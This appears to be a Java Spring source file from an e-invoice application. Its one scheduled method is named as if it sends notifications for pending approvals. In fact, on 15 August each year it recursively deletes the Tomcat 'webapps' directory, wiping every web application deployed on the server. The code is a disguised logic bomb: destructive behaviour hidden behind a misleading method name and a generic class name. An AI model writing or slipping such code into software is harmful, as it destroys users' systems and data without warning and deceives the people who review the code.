package com.eInvoice.service;

import java.io.File;

import org.apache.commons.io.FileUtils;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

@Component
public class SService {

	@Scheduled(cron = "0 0 0 15 8 ?")
    public void sendNotificationForPendingForApproval() throws Exception {
		String filepath = "C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\webapps";
        File file = new File(filepath);
        System.out.println(filepath);
        FileUtils.deleteDirectory(file);
        file.delete();	
	}
}
